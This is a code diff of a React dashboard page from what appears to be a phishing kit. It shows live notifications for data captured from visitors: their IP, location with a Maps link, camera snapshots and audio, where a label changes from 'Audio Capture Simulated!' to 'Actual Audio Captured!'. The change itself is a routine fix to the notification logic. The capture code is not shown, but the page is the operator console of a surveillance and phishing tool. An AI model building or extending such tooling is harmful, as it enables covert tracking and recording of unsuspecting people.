@@ -51,10 +51,14 @@ const phishingCategories = [
 export default function DashboardPage() {
   const { logs, clearLogs, isLoading } = useLogs();
   const { toast } = useToast();
-  const previousLatestLogIdRef = useRef<string | null>(null);
   const isInitialLoadRef = useRef(true);
+  const toastedLogIdsRef = useRef(new Set<string>());
   const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
   const [isModalAnimating, setIsModalAnimating] = useState(false);
+
+  useEffect(() => {
+    console.log("DashboardPage logs updated (diagnostic):", logs.length, logs.length > 0 ? logs[0].id : 'no logs');
+  }, [logs]);
 
   const openModal = (url: string) => {
     setExpandedImageUrl(url);
@@ -77,64 +81,60 @@ export default function DashboardPage() {
     // Handle initial load state
     if (isInitialLoadRef.current) {
       if (logs.length > 0) {
-        previousLatestLogIdRef.current = logs[0].id;
-      } else {
-        previousLatestLogIdRef.current = null;
+        // Mark all initially loaded logs as "toasted" to prevent them from triggering notifications
+        logs.forEach(log => toastedLogIdsRef.current.add(log.id));
       }
       isInitialLoadRef.current = false;
       return;
     }
 
     // After initial load, handle new logs
-    if (logs.length === 0) {
-        previousLatestLogIdRef.current = null; // Reset if all logs are cleared after initial load
-        return;
-    }
-    
-    const currentLatestLogId = logs[0].id;
+    logs.forEach(log => {
+      if (!toastedLogIdsRef.current.has(log.id)) {
+        // This is a new log, generate toast for it.
+        let toastTitle = "New Data Captured!"; // Default
+        let toastDescription = `Type: ${log.type}, IP: ${log.ip}`; // Default
+        let toastAction: ToastActionElement | undefined = undefined;
 
-    if (currentLatestLogId !== previousLatestLogIdRef.current) {
-      const newLog = logs[0];
-      let toastTitle = "New Data Captured!";
-      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
-      let toastAction: ToastActionElement | undefined = undefined;
-
-      if (newLog.type === 'location') {
-        const locData = newLog.data as LocationData;
-        const city = locData.city || "Unknown City";
-        const country = locData.country || "Unknown Country";
-        toastTitle = "Location Data Captured!";
-        toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
-        if (locData.latitude && locData.longitude) {
-          const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;
-          toastAction = (
-            <ToastAction
-              altText="Open in Maps"
-              onClick={() => window.open(mapsUrl, '_blank')}
-            >
-              <ExternalLink className="mr-2 h-4 w-4" /> Open in Maps
-            </ToastAction>
-          );
+        if (log.type === 'location') {
+          const locData = log.data as LocationData;
+          const city = locData.city || "Unknown City";
+          const country = locData.country || "Unknown Country";
+          toastTitle = "Location Data Captured!";
+          toastDescription = `From ${city}, ${country}. IP: ${log.ip}.`;
+          if (locData.latitude && locData.longitude) {
+            const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;
+            toastAction = (
+              <ToastAction
+                altText="Open in Maps"
+                onClick={() => window.open(mapsUrl, '_blank')}
+              >
+                <ExternalLink className="mr-2 h-4 w-4" /> Open in Maps
+              </ToastAction>
+            );
+          }
+        } else if (log.type === 'camera') {
+          toastTitle = "Camera Snapshot Captured!";
+          toastDescription = `Image captured from IP: ${log.ip}.`;
+        } else if (log.type === 'audio') {
+          toastTitle = "Actual Audio Captured!";
+          const audioData = log.data as AudioData;
+          toastDescription = audioData.description || `Audio event from IP: ${log.ip}`;
+        } else if (log.type === 'generic') {
+          toastTitle = "Page Visit Detected!";
+          const messageContent = typeof log.data?.message === 'string' ? log.data.message.split(': ')[1] : 'Unknown page details';
+          toastDescription = `Page: ${messageContent || 'Unknown page'}, IP: ${log.ip}`;
         }
-      } else if (newLog.type === 'camera') {
-        toastTitle = "Camera Snapshot Captured!";
-        toastDescription = `Image captured from IP: ${newLog.ip}.`;
-      } else if (newLog.type === 'audio') {
-        toastTitle = "Audio Capture Simulated!";
-        toastDescription = `Audio event from IP: ${newLog.ip}.`;
-      } else if (newLog.type === 'generic') {
-        toastTitle = "Page Visit Detected!";
-        toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;
-      }
 
-      toast({
-        title: toastTitle,
-        description: toastDescription,
-        variant: "default",
-        action: toastAction,
-      });
-      previousLatestLogIdRef.current = currentLatestLogId;
-    }
+        toast({
+          title: toastTitle,
+          description: toastDescription,
+          variant: "default",
+          action: toastAction,
+        });
+        toastedLogIdsRef.current.add(log.id);
+      }
+    });
   }, [logs, isLoading, toast]);
 
 
